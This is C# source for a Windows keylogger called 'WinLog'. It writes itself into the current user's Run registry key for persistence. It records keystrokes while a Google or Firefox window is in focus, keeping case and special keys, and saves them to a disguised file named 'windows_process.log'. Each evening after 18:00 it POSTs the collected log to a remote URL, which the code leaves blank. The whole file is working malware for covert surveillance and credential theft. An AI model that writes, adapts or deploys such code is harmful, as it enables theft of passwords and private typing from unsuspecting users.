using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;
using System.Text;
using System.Net.Http;
using Microsoft.Win32;

namespace winlog
{
    class Program
    {

        private static readonly string URL = " "; //url
        private static readonly HttpClient client = new HttpClient();

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        private static void SetStartup()
        {
            try
            {
                string keys =
                @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run";
                string value = "WinLog";

                if (Registry.GetValue(keys, value, null) == null)
                {
                    // if key doesn't exist
                    using (RegistryKey key =
                    Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        string path = Application.ExecutablePath;
                        key.SetValue("WinLog", path);
                        key.Dispose();
                        key.Flush();
                       MessageBox.Show("success");
                    }
                }
                else
                {
                        MessageBox.Show("exists");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        static async void postRequest(FormUrlEncodedContent content)
        {
            System.Net.Http.HttpResponseMessage response;
            string responseString = "";
            try
            {
                response = await client.PostAsync(URL, content);
                responseString = await response.Content.ReadAsStringAsync();
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
            }
            File.WriteAllText("response.log", responseString);
        }
        static bool IsForegroundWindowInteresting(String s)
        {
            IntPtr _hwnd = GetForegroundWindow();
            StringBuilder sb = new StringBuilder(256);
            GetWindowText(_hwnd, sb, sb.Capacity);
            if (sb.ToString().ToUpperInvariant().Contains(s.ToUpperInvariant()))
                return true;
            return false;
        }
        [STAThread]
        static void Main(String[] args)
        {
            SetStartup();

            string buf = "";
            bool flag = false;
            while (true)
            {
                Thread.Sleep(100);
                if (!(IsForegroundWindowInteresting("google") || IsForegroundWindowInteresting("firefox"))) continue;
                bool switchShift = false;
               
                for (int i = 0; i < 255; i++)
                {
                    bool isBig = Console.CapsLock | switchShift;

                    if (Console.CapsLock && switchShift)
                    {
                        isBig = false;
                    }

                    int state = GetAsyncKeyState(i);
                    if (state != 0)
                    {
                        if (((Keys)i) == Keys.Space)
                        {
                            buf += " "; continue;
                        }
                        if (((Keys)i) == Keys.Enter)
                        {
                            buf += "\r\n"; continue;
                        }
                        if (((Keys)i).ToString().Contains("Shift"))
                        {
                            switchShift = !switchShift;
                            continue;
                        }
                        if (((Keys)i) == Keys.Capital || ((Keys)i) == Keys.ControlKey || ((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.RControlKey || ((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton)
                            continue;
                        if (((Keys)i).ToString().Length == 1)
                        {
                            if (!isBig)
                            {
                                buf += ((Keys)i).ToString().ToLowerInvariant();
                            }
                            else
                            {
                                buf += ((Keys)i).ToString();
                            }
                        }
                        else
                        {
                            buf += $"<{((Keys)i).ToString()}>";
                        }
                        if (buf.Length > 10)
                        {
                            try{
                            File.AppendAllText("windows_process.log", buf);

                            }catch(Exception e ){
                                            MessageBox.Show(e.Message);

                            }

                            buf = "";
                        }
                    }
                }
                if (DateTime.Now.Hour > 18 && !flag)
                {
                    flag = true;
                    string data="";
                    try{
                              data =File.ReadAllText("windows_process.log");
                            }catch(Exception e ){
                                            MessageBox.Show(e.Message);
                            }

                    var values = new Dictionary<string, string>
                    {
                      { "time", System.DateTime.Now.ToString() },
                      { "log", data }
                    };


                    var content = new FormUrlEncodedContent(values);
                   postRequest(content);

                }
                if (DateTime.Now.Hour >= 0 && DateTime.Now.Hour < 18 && flag)
                    flag = false;

            }
        }
    }
}
